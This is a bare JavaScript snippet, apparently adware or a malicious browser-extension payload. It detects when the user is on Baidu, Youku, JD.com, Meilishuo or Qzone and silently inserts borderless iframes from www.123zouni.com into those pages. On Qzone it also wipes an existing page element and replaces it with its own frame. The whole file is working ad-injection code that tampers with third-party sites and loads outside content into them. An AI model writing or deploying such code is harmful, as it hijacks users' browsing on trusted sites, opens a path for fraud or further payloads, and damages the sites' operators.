(function(win,doc){
	if(!('__sc_xjb_xhg_loaded__' in window)){
		window.__sc_xjb_xhg_loaded__ = true;
		if(/www.baidu.com/.test(top.location.href)){
			var __box_sc_xjb_ = document.querySelector("#head .s_form_wrapper");
			if(__box_sc_xjb_){
				bd_ifr = document.createElement('iframe');
				var f = __box_sc_xjb_.appendChild(bd_ifr);
				f.src = "http://www.123zouni.com/tb/v1/index.html";
				f.width = '150px';
				f.height = '63px';
				f.style.overflow = 'hidden';
				f.style.border = 'none';
			}
		}	
		if(/v.youku.com/.test(top.location.href)){
			var __box_sc_xjb_ = document.querySelector(".sideCol");
			if(__box_sc_xjb_){
				var fc1 = __box_sc_xjb_.firstChild;
				var bd_ifr = document.createElement('iframe');
				bd_ifr.src = "http://www.123zouni.com/tb/v1/t3.html";
				bd_ifr.style.overflow = 'hidden';
				bd_ifr.style.border = 'none';
				bd_ifr.height = '210px';
				__box_sc_xjb_.insertBefore(bd_ifr,fc1);
			}
		}	
		if(window.__wgt_0_2){
			__wgt_0_2.innerHTML = '<iframe src="http://www.123zouni.com/tb/v1/index.html" width="150px" height="53px" style="overflow: hidden; border: none;"></iframe>'
		}
		if(/item.jd.com/.test(top.location.href)){
				f = document.createElement('iframe');
				f.src = "http://www.123zouni.com/tb/v1/t4.html";
				f.width = '250px';
				f.height = '180px';
				f.style.overflow = 'hidden';
				f.style.border = 'none';

				jQuery("#brand-bar").append(f);
		}
		if(/www.meilishuo.com/.test(top.location.href)){
				f = document.createElement('iframe');
				f.src = "http://www.123zouni.com/tb/v1/t4.html";
				f.width = '250px';
				f.height = '160px';
				f.style.marginLeft = '-15px';
				f.style.marginTop = '15px';
				f.style.overflow = 'hidden';
				f.style.border = 'none';

				jQuery(".maybe-like .hd").append(f);
		}
		if(/user.qzone.qq.com/.test(top.location.href)){
				f = document.createElement('iframe');
				f.src = "http://www.123zouni.com/tb/v1/t5.html";
				f.width = '554px';
				f.height = '128px';
				f.style.overflow = 'hidden';
				f.style.border = 'none';
				if(jQuery("#idQbossHotbar").length)
					jQuery("#idQbossHotbar").empty().append(f);
				else
					jQuery("#QM_Mood_Poster_Container").prepend(f);
		}
	}
})(window,document);